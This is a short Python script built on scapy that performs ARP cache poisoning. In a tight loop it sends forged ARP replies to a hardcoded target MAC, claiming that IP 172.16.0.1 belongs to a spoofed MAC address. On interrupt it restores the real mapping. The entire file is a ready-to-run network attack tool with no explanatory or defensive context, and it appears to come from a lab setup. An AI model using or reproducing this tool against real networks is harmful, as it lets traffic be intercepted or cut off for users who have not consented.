import time

from scapy.layers.l2 import Ether, ARP
from scapy.all import sendp

TARGET_MAC = "00:e0:4c:7f:ee:e6"
# TARGET_MAC = "4c:b7:e0:8f:32:58"
# TARGET_MAC = "ff:ff:ff:ff:ff:ff"
FORGERY_IP = "172.16.0.1"
FORGERY_MAC = "00:11:45:14:19:19"
REAL_MAC = "00:30:18:0a:17:d4"
IFACE = "enp5s0"


def send_arp_request(arp_mac: str,
                     arp_ip: str = FORGERY_IP,
                     target_mac: str = TARGET_MAC) -> None:
    ether_packet = Ether()
    ether_packet.dst = target_mac
    arp_packet = ARP()
    arp_packet.op = 2
    arp_packet.hwsrc = arp_mac
    arp_packet.psrc = arp_ip
    arp_packet.hwdst = target_mac
    frame = ether_packet / arp_packet
    # print("Packet to send:")
    # frame.show()
    sendp(frame, iface=IFACE, verbose=False)


def attack() -> None:
    send_arp_request(FORGERY_MAC)


def restore() -> None:
    send_arp_request(REAL_MAC)


def main() -> None:
    t = 0
    print("Starting ARP poisoning towards target...")
    try:
        while True:
            attack()
            time.sleep(0.01)
            t += 1
            if t % 50 == 0:
                print(f"Sent {t} ARP attack packets")
    except KeyboardInterrupt:
        print("Restoring ARP table for target...")
        for i in range(100):
            restore()


if __name__ == "__main__":
    main()
